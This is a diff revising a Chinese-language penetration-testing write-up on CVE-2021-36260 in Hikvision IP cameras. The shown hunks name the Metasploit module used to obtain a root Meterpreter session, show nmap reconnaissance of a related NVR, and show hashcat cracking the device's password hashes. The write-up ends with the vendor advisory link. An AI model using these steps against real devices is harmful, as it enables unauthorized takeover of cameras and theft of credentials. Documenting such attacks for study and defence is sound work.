@@ -1,5 +1,6 @@
-# Hikvision IP Camera Unauthenticated Command Injection
+# Hikvision IP 摄像头未经身份验证的命令注入
 
+**英文**: Hikvision IP Camera Unauthenticated Command Injection.  
 **CVE 代码**: CVE-2021-36260.  
 
 ## 设备发现
@@ -30,7 +31,8 @@ PORT     STATE SERVICE   VERSION
 ...
 ```
 
-通过 netdiscover 发现局域网存在 Hikvision 设备, 使用 namp 扫描后可以发现目标启用了 RTSP 服务, 且被判断为 Hikvision IP Camera.  
+通过 netdiscover 发现局域网中存在 Hikvision 设备.  
+使用 namp 扫描其开放的端口和服务, 结果显示目标设备在端口 554 上运行了 RTSP 服务, 且被识别为 Hikvision IP Camera.  
 
 ## 漏洞利用
 
@@ -75,8 +77,8 @@ meterpreter > getuid
 Server username: root
 ```
 
-查找相关模块, 并实施渗透.  
-成功获取拥有 root 权限的 Meterpreter.  
+查找并使用模块 `linux/http/hikvision_cve_2021_36260_blind`.  
+成功获取建立 root 权限的 Meterpreter 会话.  
 
 ```
 meterpreter > sysinfo
@@ -121,7 +123,7 @@ Connection list
 
 ```
 
-通过网络状态可以看出, 除了与本机(`192.168.2.100`)和一台外网计算机(`[DEL]`)进行通讯, 还将 RTSP 流推给了另一台局域网计算机(`192.168.2.109`).  
+通过网络状态可以看出, 除了与本机(`192.168.2.100`)和一台外网计算机(`[DEL]`)进行通讯外, 还使用 RTSP 协议与另一台位于局域网内的计算机(`192.168.2.109`)通讯.  
 
 ```sh
 > sudo nmap -sV 192.168.2.109
@@ -137,7 +139,7 @@ PORT      STATE SERVICE VERSION
 ...
 ```
 
-通过 nmap 的检测结果可以看出, 这台局域网计算机为 Hikvision NVR.  
+通过 nmap 的检测结果可以确定这台局域网计算机为 Hikvision NVR.  
 经测试也可以使用相同的账户登录 HTTP 后台.  
 
 ## 弱密码攻击
@@ -156,7 +158,7 @@ admin:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/:/bin/psh
 root:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/root/:/bin/psh
 admin:$1$yi$KMvI/d5vTBFIySCw1EjGt0:0:0:root:/:/bin/psh
 
-> hashcat -o result.txt passwd Repos/SecLists/Passwords/Leaked-Databases/*.txt
+> hashcat -o result.txt passwd SecLists/Passwords/Leaked-Databases/*.txt
 hashcat (v6.2.6) starting in autodetect mode
 
 ...
@@ -168,7 +170,7 @@ Hash.Target......: $1$yi$KMvI/d5vTBFIySCw1EjGt0
 Time.Started.....: [DEL] (1 sec)
 Time.Estimated...: [DEL] (0 secs)
 Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (Repos/SecLists/Passwords/Leaked-Databases/000webhost.txt)
+Guess.Base.......: File (SecLists/Passwords/Leaked-Databases/000webhost.txt)
 Guess.Queue......: 1/53 (1.89%)
 Speed.#1.........:  1029.6 kH/s (5.18ms) @ Accel:64 Loops:31 Thr:256 Vec:1
 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
@@ -203,5 +205,4 @@ hashcat 成功查找到结果, 得到用户 `root` 和 `admin` 的密码 `l12345
 
 ## 防范
 
-- https://www.hikvision.com/sg/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/security-notification-command-injection-vulnerability-in-some-hikvision-products/.
-
+- <https://www.hikvision.com/sg/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/>.
